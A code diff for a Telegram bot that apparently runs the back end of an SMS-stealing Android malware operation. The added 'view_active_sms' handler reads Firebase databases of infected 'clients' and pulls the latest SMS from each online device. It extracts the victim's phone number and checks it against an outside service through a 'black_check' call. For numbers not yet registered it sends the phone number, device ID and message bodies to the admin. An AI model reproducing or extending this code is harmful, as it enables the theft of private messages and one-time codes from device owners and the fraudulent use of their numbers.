@@ -366,8 +366,9 @@ def get_main_menu():
         [InlineKeyboardButton(text="🗑️ Clear Proxies", callback_data="clear_proxies"),
          InlineKeyboardButton(text="🟢 Check Online Devices", callback_data="check_devices")],
         [InlineKeyboardButton(text="📊 Check Number Status", callback_data="check_numbers_menu"),
-         InlineKeyboardButton(text="⚡ Check Proxy Health", callback_data="check_proxies")],
-        [InlineKeyboardButton(text="🚀 Start Automation", callback_data="start_automation")]
+         InlineKeyboardButton(text="📋 View Active Devices & SMS", callback_data="view_active_sms")],
+        [InlineKeyboardButton(text="⚡ Check Proxy Health", callback_data="check_proxies"),
+         InlineKeyboardButton(text="🚀 Start Automation", callback_data="start_automation")]
     ])
 
 class LiveLogger:
@@ -540,7 +541,6 @@ async def process_check_numbers_input(message: types.Message, state: FSMContext)
         digits = re.sub(r'[^0-9]', '', line)
         if len(digits) >= 10:
             phone_num = "+91" + digits[-10:]
-            clean_acc = digits[-10:]
             
             client = AsyncHero11Client(phone_num, default_code)
             try:
@@ -562,6 +562,80 @@ async def process_check_numbers_input(message: types.Message, state: FSMContext)
         parse_mode="HTML",
         reply_markup=get_main_menu()
     )
+
+@dp.callback_query(F.data == "view_active_sms")
+async def cb_view_active_sms(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return
+    if not USER_DATA["firebase_dbs"]:
+        await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
+        return
+
+    status_msg = await callback.message.answer("🔍 Scanning online unregistered devices and fetching their top 5 recent SMS histories...")
+    
+    try:
+        import aiohttp
+        report_lines = []
+        default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
+        
+        async with aiohttp.ClientSession() as session:
+            for fb_url in USER_DATA["firebase_dbs"]:
+                db_short_id = fb_url.split('//')[1].split('.')[0][:8]
+                try:
+                    async with session.get(f"{fb_url}clients.json", timeout=8) as r:
+                        clients_data = await r.json() or {}
+
+                    for cid, cdata in clients_data.items():
+                        if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
+                            try:
+                                async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=5', timeout=5) as m_req:
+                                    msgs = await m_req.json()
+                                    phone = extract_phone(msgs) if msgs else None
+                                    if phone:
+                                        full_phone = "+91" + phone
+                                        # Check if unregistered
+                                        client = AsyncHero11Client(full_phone, default_code)
+                                        check_res = await client.black_check()
+                                        await client.close()
+                                        
+                                        if check_res != "SKIP_EXISTS":
+                                            # Unregistered active device found! Collect top recent SMS
+                                            sms_list = []
+                                            if isinstance(msgs, dict):
+                                                for m_key, m_val in list(msgs.items())[-5:]:
+                                                    if isinstance(m_val, dict):
+                                                        time_str = str(m_val.get("time") or m_val.get("timestamp") or "N/A")
+                                                        body_str = str(m_val.get("body") or m_val.get("message") or "N/A")
+                                                        sms_list.append(f"   [{time_str}] {body_str}")
+                                            
+                                            sms_block = "\n".join(sms_list) if sms_list else "   <i>No messages found</i>"
+                                            report_lines.append(
+                                                f"📱 <b>Phone:</b> <code>{full_phone}</code>\n"
+                                                f"🆔 <b>Device ID (CID):</b> <code>{cid}</code>\n"
+                                                f"📂 <b>DB:</b> {db_short_id}\n"
+                                                f"💬 <b>Top Recent SMS:</b>\n{sms_block}\n"
+                                                f"-----------------------------------"
+                                            )
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+
+        if not report_lines:
+            await status_msg.edit_text("ℹ️ No active unregistered online devices found across loaded databases.", reply_markup=get_main_menu())
+        else:
+            # Chunk long reports if needed
+            full_report = "\n".join(report_lines)
+            if len(full_report) > 4000:
+                full_report = full_report[:4000] + "\n\n<i>[Truncated due to length]</i>"
+            await status_msg.edit_text(
+                f"📋 <b>Active Unregistered Devices & SMS History:</b>\n\n{full_report}",
+                parse_mode="HTML",
+                reply_markup=get_main_menu()
+            )
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Error fetching active device SMS: {e}", reply_markup=get_main_menu())
+    await callback.answer()
 
 @dp.callback_query(F.data == "check_proxies")
 async def cb_check_proxies(callback: types.CallbackQuery):
@@ -783,7 +857,7 @@ async def main():
 
 if __name__ == "__main__":
     if sys.platform.startswith('win'):
-        asyncio.set_event_loop_policy(sys.WindowsSelectorEventLoopPolicy())
+        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
